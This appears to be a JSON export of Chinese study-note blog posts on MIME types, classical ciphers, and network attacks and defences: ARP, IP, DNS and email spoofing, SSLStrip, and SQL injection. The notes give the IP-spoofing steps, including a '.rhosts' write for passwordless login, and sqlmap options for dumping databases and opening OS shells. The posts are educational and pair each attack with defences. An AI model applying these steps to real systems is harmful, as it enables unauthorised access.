.ram audio/x-pn-realaudioMPEG文件 .mpg,.mpeg video/mpegAVI文件 .avi video/x-msvideoGZIP文件 .gz application/x-gzipTAR文件 .tar application/x-tar Internet中有一个专门组织IANA来确认标准的MIME类型，但Internet发展的太快，很多应用程序等不及IANA来确认他们使用的MIME类型为标准类型。因此他们使用在类别中以x-开头的方法标识这个类别还没有成为标准，例如：x-gzip，x-tar等。事实上这些类型运用的很广泛，已经成为了事实标准。只要客户机和服务器共同承认这个MIME类型，即使它是不标准的类型也没有关系，客户程序就能根据MIME类型，采用具体的处理手段来处理数据。而Web服务器和浏览器（包括操作系统）中，缺省都设置了标准的和常见的MIME类型，只有对于不常见的 MIME类型，才需要同时设置服务器和客户浏览器，以进行识别。 由于MIME类型与文档的后缀相关，因此服务器使用文档的后缀来区分不同文件的MIME类型，服务器中必须定义文档后缀和MIME类型之间的对应关系。而客户程序从服务器上接收数据的时候，它只是从服务器接受数据流，并不了解文档的名字，因此服务器必须使用附加信息来告诉客户程序数据的MIME类型。服务器在发送真正的数据之前，就要先发送标志数据的MIME类型的信息，这个信息使用Content-type关键字进行定义，例如对于HTML文档，服务器将首先发送以下两行MIME标识信息,这个标识并不是真正的数据文件的一部分。 Content-type: text/html 注意，第二行为一个空行，这是必须的，使用这个空行的目的是将MIME信息与真正的数据内容分隔开。 MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。官方的 MIME 信息是由 Internet Engineering Task Force (IETF) 在下面的文档中提供的：RFC-822 Standard for ARPA Internet text messages RFC-2045 MIME Part 1: Format of Internet Message Bodies RFC-2046 MIME Part 2: Media Types RFC-2047 MIME Part 3: Header Extensions for Non-ASCII Text RFC-2048 MIME Part 4: Registration Procedures RFC-2049 MIME Part 5: Conformance Criteria and Examples 不同的应用程序支持不同的 MIME 类型。","categories":[{"name":"网络编程","slug":"网络编程","permalink":"http://aotle.top/categories/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://aotle.top/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"密码学笔记1-2","slug":"密码学笔记1-2","date":"2020-11-30T10:33:22.000Z","updated":"2020-11-30T14:08:57.534Z","comments":true,"path":"2020/11/30/mima1/","link":"","permalink":"http://aotle.top/2020/11/30/mima1/","excerpt":"密码学课程笔记1，2章","text":"密码学课程笔记1，2章 密码学术语： 明文 P 密文 C 密钥 K 加密 E 加密算法 解密 D 解密算法 加密：E(P)=C 解密：D(C)=P 明文空间M 全体明文的集合 密文空间C 全体密文的集合 密钥空间K 全体密钥的集合 加密算法E 解密算法D 密码攻击种类： 惟密文攻击 -被动攻击 只有截获的密文 已知明文攻击 -被动攻击 除了截获的密文 还有一些已知的明文密文对 选择明文攻击 -主动攻击 除了上面的条件之外，还可以选择明文，获得加密的密文 选择密文攻击 -主动攻击 选择密文获得明文 经典密码学：古典密码都是对称密码体制。 分类： 替换密码/代换密码 用一个符号代替另外一个符号 单表替换 移位代换密码 乘数密码 仿射密码 多表替换 置换密码/换位密码 对符号进行重新排序 替换密码 单表替换 通过预先建立的替换表，通过查表，将明文替换成密文。 密钥就是替换表。 移位密码（凯撒密码） 加上偏移量然后 mod c=(m+k)mod p m=(C-k)mod p example： 乘数密码 乘以偏移量，然后取mod，这里偏移量k和模p要互素，即(k,p)=1 c=(m*k)mod p m=(c*k^-1)mod p 仿射密码 就是移位密码和乘数密码结合 c=(m*k1+k2)mod p m=(c-k2)*k1^-1 mod p 例：playfair密码，ADFGX密码。 多表替换 有多个替换表依次对符号进行加密。 例：维吉尼亚密码，（Hill密码 *没讲） 周期多表替换，替换表是有限的，循环使用。 古代密码体制分析 穷举分析 对于加同余密码，明文是字母表，k只有25种可能值，明文是八位ASC||时，k只有255种。 对于乘数密码，k只能&lt;=fai(n)，去掉n=1，只有fai(n)-1种。 仿射密码也只有nfai(n)-1种。 分析统计特性 对多表替换，先确定周期，然后猜测密钥： 确定周期主要两种方法，Kasiski测试法，重合指数法。 Kasiski测试法： 重合指数法： 举个栗子： 第二步：确定密钥字（了解就可以了，绝对不考。。太难理解了）","categories":[{"name":"密码学","slug":"密码学","permalink":"http://aotle.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"密码学","slug":"密码学","permalink":"http://aotle.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"网络安全复习笔记—欺骗攻击与防御","slug":"网络安全复习笔记—欺骗攻击与防御","date":"2020-11-28T07:26:53.000Z","updated":"2020-12-03T13:56:20.456Z","comments":true,"path":"2020/11/28/qipianattack/","link":"","permalink":"http://aotle.top/2020/11/28/qipianattack/","excerpt":"复习笔记——欺骗攻击与防御","text":"复习笔记——欺骗攻击与防御 Arp欺骗arp协议，地址解析协议，目的是实现IP地址到mac地址到转换。 PC1依据OSI模型①依次从上至下对数据进行封装，包括对ICMP Date加IP包头的封装，但是到了封装MAC地址的时候，②PC1首先查询自己的ARP缓存表，发现没有IP2和他的MAC地址的映射，这个时候MAC数据帧封装失败。我们使用ping命令的时候，是指定PC2的IP2的，计算机是知道目的主机的IP地址，能够完成网络层的数据封装，因为设备通信还需要对方的MAC地址，但是PC1的缓存表里没有，所以在MAC封装的时候填入不了目的MAC地址。 那么PC1为了获取PC2的MAC地址，③PC1要发送询问信息，询问PC2的MAC地址，询问信息包括PC1的IP和MAC地址、PC2的IP地址，这里我们想到一个问题，即使是询问信息，也是需要进行MAC数据帧的封装，那这个询问信息的目的MAC地址填什么呢，规定当目的MAC地址为ff-ff-ff-ff-ff-ff时，就代表这是一个询问信息，也即使后面我要说的广播。 PC2收到这个询问信息后，将这里面的IP1和MAC1（PC1的IP和MAC）添加到本地的ARP缓存表中，然后④PC2发送应答信息，对数据进行IP和MAC的封装，发送给PC1，因为缓存表里已经有PC1的IP和MAC的映射了呢。这个应答信息包含PC2的IP2和MAC2。PC1收到这个应答信息，理所应当的就获取了PC2的MAC地址，并添加到自己的缓存表中。 经过这样交互式的一问一答，PC1和PC2都获得了对方的MAC地址，值得注意的是，目的主机先完成ARP缓存，然后才是源主机完成ARP缓存。之后PC1和PC2就可以真正交流了。 ARP之广播请求单播回应 上图面的图解是不完全的ARP协议，因为在局域网里边不会只有两台主机，这里就要考虑如何在局域网众多主机里获得目的主机的MAC。 和上面的一样，刚开始PC1并不知道PC2的MAC地址，同样需要发送ARP请求，但是这个局域网里主机很多，怎么唯独获取PC2的MAC呢，①我们想到和一群陌生人交流一样，可以挨着询问一遍，这就是我们要说的广播，首先PC1广播发送询问信息（信息和上一张图介绍的一样），在这个普通交换机上连接的设备都会受到这个PC1发送的询问信息。 接下来②需要做的是，所有在这个交换机上的设备需要判断此询问信息，如果各自的IP和要询问的IP不一致，则丢弃，如图PC3、Route均丢弃该询问信息，而对于PC2判断该询问信息发现满足一致的要求，则接受，同样的写入PC1的IP和MAC到自己的ARP映射表中。 最后，③PC2单播发送应答信息给PC1，告诉PC1自己的IP和MAC地址。 二、ARP数据包信息 ARP数据的详细信息列表如下 arp ARP请求包 ARP应答包 内容格式和上图相似，不过会有目的地址对应的MAC地址，ARP数据包类型字段为2。 三、ARP攻击 我们知道，当PC1对PC2正常通信的时候（先别管攻击者PC3），PC2、PC1会先后建立对方的IP和MAC地址的映射（即建立ARP缓存表），同时对于交换机而言，它也具有记忆功能，会基于源MAC地址建立一个CAM缓存表（记录MAC对应接口的信息），理解为当PC1发送消息至交换机的Port1时，交换机会把源MAC（也就是MAC1）记录下来，添加一条MAC1和Port1的映射，之后交换机可以根据MAC帧的目的MAC进行端口转发，这个时候PC3只是处于监听状态，会把PC1的广播丢弃。 正常的PC3会把广播包丢弃，同样的PC3可以抓住这一环节的漏洞，把不属于自己的广播包接收，同时回应一个虚假的回应包，告诉PC1我就是PC2 （IP2-MAC3），这样PC1会收到两个回应包（一个正确的IP2-MAC2，一个虚假的IP2-MAC3），但是PC1并不知道到底哪个是真的，所以PC1会做出判断，并且判断后到达的为真，那么怎么让虚假的回应包后到达呢，PC3可以连续不断的发送这样的回应包，总会把哪个正确的回应包覆盖掉。 而后PC1会建立IP2-MAC3这样一条ARP缓存条目，以后当PC1给PC2发送信息的时候，PC1依据OSI模型从上至下在网络层给数据封装目的IP为IP2的包头，在链路层通过查询ARP缓存表封装目的MAC为MAC3的数据帧，送至交换机，根据查询CAM表，发现MAC3对应的接口为Port3，就这样把信息交付到了PC3，完成了一次ARP攻击。 如果ARP攻击严重话，会导致同一个局域网（也是同一个广播域）的所有主机的ARP缓存表中都存放着错误的IP和MAC的映射，如上图，每台主机的ARP缓存表中，不论哪个IP，都会映射到攻击者的MAC地址MAC1上，这样该局域网内的所有主机的消息都发送到Hacker的主机上。 常用攻击工具：ettercap 防御：arp防火墙，静态arp Ip欺骗IP欺骗是在服务器不存在任何漏洞的情况下，通过利用TCP/IP协议本身存在的一些缺陷进行攻击的方法，这种方法具有一定的难度，需要掌握有关协议的工作原理和具体的实现方法。 IP地址欺骗是指行动产生的IP数据包为伪造的源IP地址，以便冒充其他系统或发件人的身分。 一、TCP、IP协议的简单说明： TCP/IP（传输控制协议/网际协议）是一种网络通信协议，它规范了网络上的所有通信设备，尤其是一个主机与另一个主机之间的数据传输格式以及传送方式，TCP/IP是因特网的基础协议。要想当黑客就有必要了解TCP/IP协议。 在数据传送中，可以形象的理解为有两个信封：TCP和IP信封。要送递的信息被分成若干段，每一段塞入一个TCP信封，并在该信封上记录有分段号的信息，再将TCP信封塞入IP大信封里，发送到网上。在扫收端，一个TCP软件包收集信封，抽出数据，按发送方的顺序还原，并加以校验，若发现差错，TCP将会要求重发。因此TCP/IP在因特网中几乎可以无差错地传送数据。对因特网用户来说，并不需要了解网络协议的整个结构，仅需了解IP的地址格式，即可与世界各地进行网络通信。 1、TCP/IP的层次结构： TCP/IP协议组中的协议因特网上数据的传输，提供了几乎目前上网所用到的所有服务，在TCP/IP协议组中有两种协议： （1）网络层协议： 网络层协议管理离散计算机间的数据传输。这些协议用户注意不到，它们是个系统表层以下工作的。比如，IP协议为用户和远程计算机提供了信息包的传输方法，它是在许多信息的基础上工作的。比如机器的IP地址。在机器的IP地址和其他信息的基础上，IP确保信息包正确达到目的机器。通过这一过程，IP和其他网络层的协议一共同用于数据传输。如果没有网络工具，用户就看不到在系统里工作的机器的IP。 （2）应用层协议： 相反地，应用层协议是可以看到的。比如，文件传输协议（FTP)是可以看到的。用户为了传一个文件而请求一个和其他计算机连接，连接建立后，就开始传输文件，在传输时，用户和远程计算机的交换的一部分是能看到的。 2、TCP/IP的重要协议： （1）地址解析协议（ARP)： 在网络上进行通信的主机必须知道对方主机的硬件地址（网卡的物理地址）。地址解析协议的目的就是将IP地址映射成物理地址。这在使信息通过网络时特别重要。一个消息（或者其他数据）在发送之前，被打包到IP包里面，或适合于因特网传输信息块中，其中包括两台计算机的IP地址。 在这个包离开发送计算机前，必须找到目标的硬件地址，这就是ARP最初到达的地方。 一个ARP请求消息会在网上广播。请求由一个进程接收，它回复物理地址。这个回复消息由原先的那台发送广播消息的计算机接收，从而传输过程就开始了。 ARP的设计包括一个缓存。为了减少广播量，ARP在缓存中保存地址映射以备后用。ARP级存保存有动态项和静态项。动态项是自动加和删除的，静态项则是保留在缓存(Cache)中，直到计算机重启为止。ARP缓存总是为本地子网保留硬件广播地址(0xffffffffffffh)用为一个永久项，此项使主机能够接收ARP广播。当果看存时，该项不会显示。每条ARP缓存记录的生命周期为10分种，如果2分种未用则删除。缓存容量满时，删除最早的记录，但是，缓存也引起了安全性的问题。那就是缓存溢出——这不是本文的讨论内容，所以就不说了。 （2）因特网控制消息协议（ICMP）： 因特网控制消息协议（ICMP)用于报告错误并IP对消息进行控制。IP运用互联组管理协议(IGMP)来告诉路由器某一网络上指导组中有哪些可用主机。 以ICMP实现的最著名的网络工具是Ping。Ping通常用来判断一台远程机器是否正开着，数据包从用户的计算机发到远程计算机，这些包通常返回到用户的计算机，如果数据据包没有返回到用户计算机，Ping程序就产生一个表示远程计算机关机的错误消息。 二、IP欺骗的理论根据： 由于TCP是面向连接的协议，所以在双方正式传输数据之前，需要用“三次握手”来建立一个稳重的连接。 这里的ip欺骗是tcp会话劫持 假设hosta和hostb两台主机进行通信，hostb首先发送带有SYN标志的数据段通知hosta建立TCP连接，TCP的可靠性就是由数据包中的多位控制字来提供的，其中最重要的是数据序列SYN和数据确认标志ACK。B将TCP报头中的SYN设为自己本次连接中的初始值（ISN）。 当hosta收到hostb的SYN包之后，会发送给hostb一个带有SYN+ACK标志的数据段，告之自己的ISN，并确认hostb发送来的第一个数据段，将ACK设置成hostb的SYN+1。 当hostb确认收到hosta的SYN+ACK数据包后，将ACK设置成hosta的SYN+1。Hosta收到hostb的ACK后，连接成功建立，双方可以正式传输数据了。 看了这个过程，我们就很容易想到，假如想冒充hostb对hosta进行攻击，就要先使用hostb的IP地址发送SYN标志给hosta，但是当hosta收到后，并不会把SYN+ACK发送到我们的主机上，而是发送到真正的hostb上去，这时IP欺骗就失败了，因为hostb根本没发送发SYN等。所以如果要冒充hostb，首先要让hostb失去工作能力，也就是所谓的拒绝服务攻击，设法让让hostb瘫痪。 可是这样还是远远不够的，最难的就是要对hosta进行攻击，必须知道hosta使用的ISN。TCP使用的ISN是一个32位的计数器，从0到4,294,967,295。TCP为每一个连接选择一个初始序列号ISN，为了防止因为延迟、重传等扰乱三次握手，ISN不能随便选取，不同的系统有着不同的算法。理解TCP如何分配ISN以及ISN随时间的变化规律，对于成功的进行IP欺骗攻击是很重要的！ISN约每秒增加128 000，如果有连接出现，每次连接将把计数器的数值增加64,000。很显然，这使得用于表示ISN的32位计数器在没有连接的情况下每9.32小时复位一次。这所以这样，是因为它有利于最大于度地减少“旧有”连接的信息干扰当前连接的机会。如果初始序例号是随意选择的，那么不能保证现有序例号是不同于先前的。假设有这样一种情况，在一个路由回路中的数据包最终跳出循环，回到了“旧有”的连接，显然这会对现有连接产生干扰。预测出攻击目标的序例号非常困难，而且各个系统也不想同，在Berkeley系统，最初的序列号变量由一个常数每秒加1产生，等加到这个常数的一半时，就开始一次连接。这样，如果开始一个合法连接，并观察到一个ISN正在使用，便可以进行预测，而且这样做有很高的可信度。现在我们假设黑客已经使用某种方法，能预测出ISN。在这种情况下，他就可以将ACK序便号送给hosta，这时连接就建立了。 三、IP欺骗攻击过程解析： IP欺骗由若干步骤组成，下面是它的详细步骤： 1、使被信任主机失去工作能力： 为了伪装成被信任主机而不露陷，需要使其完全失去工作能力。由于攻击者将要代替真正的被信任主机，他必须确保真正的被信任主机不能收到任何有效的网络数据，否则将会被揭穿。有许多方法可以达到这个目的（如SYN洪水攻击、TTN、Land等攻击）。现假设你已经使用某种方法使得被信任的主机完全失去了工作能力。 2、序例号取样和猜测： 前面讲到了，对目标主机进行攻击，必须知道目标主机的数据包序例号。通常如何进行预测呢？往往先与被攻击主机的一个端口（如：25）建立起正常连接。通常，这个过程被重复N次，并将目标主机最后所发送的ISN存储起来。然后还需要进行估计他的主机与被信任主机之间的往返时间，这个时间是通过多次统计平均计算出来的。往返连接增加64,000.现在就可以估计出ISN的大小是128,000乘以往返时间的一半，如果此时目标主机刚刚建立过一个连接，那么再加上64 ,00。 一旦估计出ISN的大小，就开始着手进行攻击，当然你的虚假TCP数据包进入目标主机时，如果刚才估计的序例号是准确的，进入的数据将被放置在目标机的缓冲区中。但是在实际攻击过程中往往没这么幸运，如果估计序例号的小于正确值，那么将被放弃。而如果估计的序例号大于正确值，并且在缓冲区的大小之内，那么该数据被认为是一个未来的数据，TCP模块将等待其他缺少的数据。如果估计序例号大于期待的数字且不在缓冲区之内，TCP将会放弃它并返回一个期望获得的数据序例号。 你伪装成被信任的主机IP，此时该主机仍然处在瘫痪状态，然后向目标主机的513端口（rlogin）发送连接请求。目标主机立刻对连接请求作出反应，发更新SYN+ACK确认包给被信任主机，因为此时被信任主机仍然处于瘫痪状态，它当然无法收到这个包，紧接关攻击者向目标主机发送ACK数据包，该包使用前面估计的序例号加1。如果攻击者估计正确的话，目标主机将会接收该ACK。连接就正式建立起了，可以开始数据传输了。这时就可以将cat ‘++’&gt;&gt;~/.rhosts命令发送过去，这样完成本次攻击后就可以不用口令直接登录到目标主机上了。如果达到这一步，一次完整的IP欺骗就算完成了，黑客已经在目标机上得到了一个Shell权限，接下来就是利用系统的溢出或错误配置扩大权限，当然黑客的最终目的还是获得服务器的root权限。 3、总结一下IP攻击的整个步骤： （1）首先使被信任主机的网络暂时瘫痪，以免对攻击造成***扰； （2）然后连接到目标机的某个端口来猜测ISN基值和增加规律； （3）接下来把源址址伪装成被信任主机，发送带有SYN标志的数据段请求连接； （4）然后等待目标机发送SYN+ACK包给已经瘫痪的主机； （5）最后再次伪装成被信任主机向目标机发送的ACK，此时发送的数据段带有预测的目标机的ISN+1； （6）连接建立，发送命令请求。 (连接是建立了,但是只能发送命令，收不到回显，因为服务器根据IP回显给了真的信任主机) IP欺骗的防御 抛弃基于地址的信任策略，不允许r*类远程调用命令执行 进行包过滤，入口过滤和出口过滤 使用加密技术，网络层采用IPSec，传输层采用tls协议。 使用随机化的初始序列号。 基于sslstrip的https会话劫持 0 引言 HTTPS作为一种安全的HTTP数据传输协议，被广泛应用于万维网上敏感信息的通信，例如交易支付等方面。然而，HTTPS也存在自身的缺陷，不能绝对保证服务端自身的安全。在网络攻防中，威胁服务器安全的行为时有发生，最常见的例子就是使用模仿银行域名的钓鱼攻击(Phishing)。随着HTTPS的广泛使用，一些新的针对HTTPS会话的劫持也开始出现，如基于中间人攻击的Surf Jacking、SSLSniff等。 文中结合HTTPS实现过程中出现的一些问题，分析了一种新的HTTPS会话劫持方法SSLStrip，同时提出了针对HTTPS会话劫持的防范措施。 1 HTTPS协议分析 HTTPS(Hyper Text Transfer Protocol over Secure Socket Layer)，是以安全为目标的HTTP通道。它是由Netscape公司开发，其目的是通过应用Netscape的安全套接字层(SSL)作为HTTP应用层的子层，实现对数据的加密以及身份的验证。当客户端向服务器提出连接要求时，首先要协商建立SSL连接，然后在SSL应用数据通道上传输HTTP数据。HTTPS使用端口443进行通信，而不同于HTTP使用端口80与TCP/IP进行通信[1]。 当HTTPS服务器与客户端进行交互时，其连接过程可以分为3个阶段：客户端与服务器之间建立TCP连接；客户端与服务器进行SSL握手；在客户端与服务器成功SSL握手后，传送已加密的HTTPS数据。 其中，完整的SSL握手过程又可分成以下4个步骤[2]： ① 建立安全能力：确定客户端浏览器与HTTPS服务器之间通信所使用的SSL版本和密码编码方式。 ② 服务器鉴别和密钥交换：HTTPS服务器向客户端发送数字证书，以证明自己的身份，此证书中包含服务器公钥及其他信息，并使用CA密钥加密。 ③ 客户端验证和密钥交换：客户端验证HTTPS服务器身份，并生成会话密钥，使用服务器公钥加密。如服务器需验证客户端，则向服务器发送客户端证书，并使用客户端自己的私钥加密。 ④ 握手完成：服务器与客户端确认会话密钥，并发送单独加密报文，表示握手完成。 在HTTPS的使用中，一些服务器也会采用SSL简单握手协议，在SSL握手过程中，服务器不需要客户端提供证书，其结果可导致欺骗的发生。 2 HTTPS会话劫持 2.1 HTTPS中间人攻击 HTTPS中间人攻击(Man-in-the-Middle Attack)[3]是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机MITM虚拟放置在网络连接中的客户端Client与服务器Server之间，在客户端与服务器进行HTTPS通信时，由MITM对HTTPS数据进行转发，Client和Server都不会意识到会话已被劫持。MITM不仅可窃听HTTPS通信还可以对信息进行篡改，达到HTTPS攻击的目的。 基于Web的HTTPS会话使用SSL协议，而SSL协议在握手协商阶段发送公钥证书。比较普遍的HTTPS中间人攻击，例如SSLSniff等，在网关截获SSL会话，替换服务器公钥证书，将公钥PKey换成自己的公钥PKey’，欺骗客户端。客户端使用PKey’加密信息并发送会话，中间人用私钥Skey’解密客户端返回会话，从而劫持会话。同时，中间人用PKey加密明文会话并返回服务器[4]。 使用SSLSniff进行HTTPS会话劫持时，在客户端收到未认证的证书时，浏览器会弹框示警，从而有可能造成客户端对MITM存在的警觉。 2.2 HTTPS会话劫持的新方法 SSLStrip (1) SSLStrip简介 在分析完HTTPS协议流程以及一种HTTPS中间人方法SSLSniff后，文中介绍一种新的HTTPS中间人会话劫持方法SSLStrip[5]。SSLStrip所能达成的目标是在客户端与服务器建立连接时，在MITM与Server之间形成HTTPS连接，而在Client与MITM之间形成HTTP连接，即将SSL层从原HTTPS连接中“剥离”。这样，既避免了在客户端验证证书时难以避免的弹框问题，又能够劫持HTTP明文数据，并同时保证客户端HTTP数据的传输，达到欺骗服务器与客户端的效果。 (2) SSLStrip的原理和实现 现实生活中，在浏览器地址栏中输入网址时，多数用户会采用直接输入网址的方式，而忽略了传输所采用的协议。例如，在登录gmail过程中，大多数用户会直接在地址栏中输入www.gmail.com，向Google服务器发送一个HTTP连接请求，而不是输入https://www.gmail.com，向服务器发送一个HTTPS连接请求。因此，用户通常接触到HTTPS的方式有两种：一种是 Web上的连接，比如当用户在gmail上输入用户名和密码后，点击的登录键，将用户的用户名和密码以HTTPS的形式POST到服务器。另一种是通过HTTP的302状态。当客户端向gmail提出HTTP连接请求时，gmail服务器会返回一个REDIRECT网址，https://www.google.com/accounts/ServiceLogin?service=mail...，用户端在接收到这个URL后，将页面重定位到该网页，并请求HTTPS连接。 从另外一个角度讲，用户通常是通过HTTP向服务器发起HTTPS连接的。而HTTP本身是以明文的形式对外传送，并不能保证数据的安全。因此，可以考虑通过对HTTP进行劫持，来实现对HTTPS劫持的目的。整个SSLStrip过程包括如下几个步骤(见图1)： ① 客户端Client向服务器Server发起HTTP连接请求； ② 中间人MITM监听客户端与服务器的HTTP数据； ③ 服务器返回给客户端的HTTP数据包被在客户端与服务器之间的中间人截获。中间人解析原HTTP数据包，将其中&lt;a href=&quot;https：//...&quot;&gt;替换成&lt;a href=&quot;http：//...&quot;&gt;，将Location:https://... 替换成Location:http://..，同时记录下所修改的URL，并保存； ④ 中间人将修改后的HTTP数据发送给客户端； ⑤ 客户端Client向服务器Server发起HTTP连接请求； ⑥ 中间人计算机解析客户端的HTTP连接请求，并与保存文件相比较。当发现存在有已修改过的HTTP URL时，将其替换成原HTTPS URL，并发送给服务器； ⑦ 与服务器保持HTTPS连接，回到步骤③； ⑧ 与客户端保持HTTP连接，回到步骤④。 SSLStrip原理流程如图2所示。 (3) SSLStrip劫持HTTPS的效果 对于服务器端而言，服务器Server从HTTPS连接开始，就与中间人MITM建立SSL连接。服务器并不能区分客户端Client和中间人MITM的区别，因而，服务器认为HTTPS是安全的。 对于客户端而言，由于中间人MITM与客户端Client之间是HTTP连接，因此并不会产生证书认证时弹框等任何示警。如图3所示，在Firefox浏览器下，SSLStrip前后的明显区别是：URL前的图标不同；URL中的https：//被替换成http：//。作为一般用户，不会注意到这些区别，而浏览器也会误认为其与服务器之间的http连接是安全的。 对于中间人而言，他们可以劫持并监听服务器与客户端之间的任何HTTP与HTTPS通信。 3 针对SSLStrip的防御 SSLStrip在SSL连接开始之前，就对客户端进行欺骗，同时与服务器进行HTTPS交互。针对SSLStrip的防御可以从两个方面开始进行： (1)针对服务器 在整个域名下，建议都使用基于SSL的HTTPS连接，不要在已经不属于SSL的对话页面上提供注册服务，以防止中间人以HTTP中间人的方式劫持HTTPS。 (2)针对客户端[6] 针对客户端的防御有以下步骤： ① 在输入涉密网站的网址时，尽量加上“https://”，以防止中间人篡改HTTP重定向后的URL； ② 对于使用IE作为浏览器的用户，在登录涉密网站时，若地址栏没有变成黄色时加以注意；对于使用其他浏览器的用户，在登录涉密网站时，注意是否显示为https://…，均可在一定程度上防范当前的中间人和网络钓鱼攻击； ③ 下载最新版高安全度的网络浏览器； ④ 对敏感账号采用认证证书，如令牌和其他形式的双因素认证； ⑤ 对来自未知发件人发出的电子邮件要高度警惕，不要以点击链接的方式接入涉密网站(而应在浏览器中输入网址)。 另外，由于SSLStrip是基于中间人攻击的，因此一些针对ARP欺骗的防御方式[7]同样可有效地用于SSLStrip的防御，比如，使用非对称加密等方式，或者使用一些带有IP过滤的以太网交换机等等。 dns欺骗1、DNS DNS即Domain Name System 的缩写，域名系统以分布式数据库的形式将域名和IP地址相互映射。DNS协议即域名解析协议，简单的说：DNS是用来将域名解析成对应ip地址的协议。 2、工作原理 访问www.baidu.com ，首先要向本地DNS服务器发出DNS请求，查询 www.baidu.com 的IP地址，如果本地DNS服务器没有在自己的DNS缓存表中发现该网址的记录，就会向根服务器发起查询，根服务器收到请求后，将com域服务器的地址返回给本地DNS服务器，本地DNS服务器则继续向com域发出查询请求，域服务器将 baidu.com 授权域名服务器的地址返回给本地DNS服务器，本地DNS服务器继续向 baidu.com 发起查询，得到www.baidu.com的IP地址。 本地DNS服务器得到www.baidu.com对应的IP地址后以dns应答包的方式传递给用户，并且在本地建立DNS缓存表。 Windows下查看和刷清空DNS缓存表的命令 12ipconfig /displaydns ipconfig /flushdns1 3、DNS欺骗 首先欺骗者向目标机器发送构造好的ARP应答数据包，ARP欺骗成功后，嗅探到对方发出的DNS请求数据包，分析数据包取得ID和端口号后，向目标发送自己构造好的一个DNS返回包，对方收到DNS应答包后，发现ID和端口号全部正确，即把返回数据包中的域名和对应的IP地址保存进DNS缓存表中，而后来的当真实的DNS应答包返回时则被丢弃。 参考： https://blog.csdn.net/xg_ren/article/details/79154965 电子邮件欺骗主要是伪造发送地址，回复地址，和钓鱼链接，附件等。 防御手段： 用户需要有良好的防范意识 smtp服务器需要开启身份验证机制。 对邮件进行加密和签名。 web欺骗伪造一模一样网站进行钓鱼，仔细分别可以区分开。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全复习笔记—web攻击与防御","slug":"网络安全复习笔记—web攻击与防御","date":"2020-11-27T03:11:38.000Z","updated":"2020-12-03T13:57:14.141Z","comments":true,"path":"2020/11/27/webgongjifangyu/","link":"","permalink":"http://aotle.top/2020/11/27/webgongjifangyu/","excerpt":"复习笔记——web攻击与防御","text":"复习笔记——web攻击与防御 sql注入攻击 参考 https://www.jianshu.com/p/078df7a35671 sql注入的原理是因为用户输入的数据被作为sql命令解释执行了。 sql注入的分类 手工注入费时间，所以最好用工具注入，比如sqlmap、havij、pangolin。 sqlmap简单介绍 -u 指定URL信息 —cookie 指定cookie值 —dbs 获取数据库信息 —current-db 列出当前应用使用的数据库 -D 指定数据库 —table 获取数据库表的信息 一般结合-D参数使用 -T 指定数据库的表 —columns 获取表字段名称，一般结合-T参数使用 -C 指定数据库的表的列 —dump 转存数据库数据，一般结合-D，-T，-C，使用。 —privileges 测试用户权限，例如 —privileges -U root 测试 root 用户权限 —os-cmd=“net user” 执行cmd指令，这里是执行net user 命令 —os-shell 获取与系统交互的shell sql注入的防御注意：但凡有SQL注入漏洞的程序，都是因为程序要接受来自客户端用户输入的变量或URL传递的参数，并且这个变量或参数是组成SQL语句的一部分，对于用户输入的内容或传递的参数，我们应该要时刻保持警惕，这是安全领域里的「外部数据不可信任」的原则，纵观Web安全领域的各种攻击方式，大多数都是因为开发者违反了这个原则而导致的，所以自然能想到的，就是从变量的检测、过滤、验证下手，确保变量是开发者所预想的。 1、检查变量数据类型和格式 如果你的SQL语句是类似where id={$id}这种形式，数据库里所有的id都是数字，那么就应该在SQL被执行前，检查确保变量id是int类型；如果是接受邮箱，那就应该检查并严格确保变量一定是邮箱的格式，其他的类型比如日期、时间等也是一个道理。总结起来：只要是有固定格式的变量，在SQL语句执行前，应该严格按照固定格式去检查，确保变量是我们预想的格式，这样很大程度上可以避免SQL注入攻击。 比如，我们前面接受username参数例子中，我们的产品设计应该是在用户注册的一开始，就有一个用户名的规则，比如5-20个字符，只能由大小写字母、数字以及一些安全的符号组成，不包含特殊字符。此时我们应该有一个check_username的函数来进行统一的检查。不过，仍然有很多例外情况并不能应用到这一准则，比如文章发布系统，评论系统等必须要允许用户提交任意字符串的场景，这就需要采用过滤等其他方案了。 2、过滤特殊符号 对于无法确定固定格式的变量，一定要进行特殊符号过滤或转义处理。 3、绑定变量，使用预编译语句 MySQL的mysqli驱动提供了预编译语句的支持，不同的程序语言，都分别有使用预编译语句的方法 实际上，绑定变量使用预编译语句是预防SQL注入的最佳方式，使用预编译的SQL语句语义不会发生改变，在SQL语句中，变量用问号?表示，黑客即使本事再大，也无法改变SQL语句的结构 什么是sql预编译 1.1：预编译语句是什么 通常我们的一条sql在db接收到最终执行完毕返回可以分为下面三个过程： 词法和语义解析 优化sql语句，制定执行计划 执行并返回结果 我们把这种普通语句称作Immediate Statements。 但是很多情况，我们的一条sql语句可能会反复执行，或者每次执行的时候只有个别的值不同（比如query的where子句值不同，update的set子句值不同,insert的values值不同）。 如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。 所谓预编译语句就是将这类语句中的值用占位符替代，可以视为将sql语句模板化或者说参数化，一般称这类语句叫Prepared Statements或者Parameterized Statements 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止sql注入。 当然就优化来说，很多时候最优的执行计划不是光靠知道sql语句的模板就能决定了，往往就是需要通过具体值来预估出成本代价。 1.2：MySQL的预编译功能 注意MySQL的老版本（4.1之前）是不支持服务端预编译的，但基于目前业界生产环境普遍情况，基本可以认为MySQL支持服务端预编译。 下面我们来看一下MySQL中预编译语句的使用。 （1）建表 首先我们有一张测试表t，结构如下所示： 12345678mysql&gt; show create table 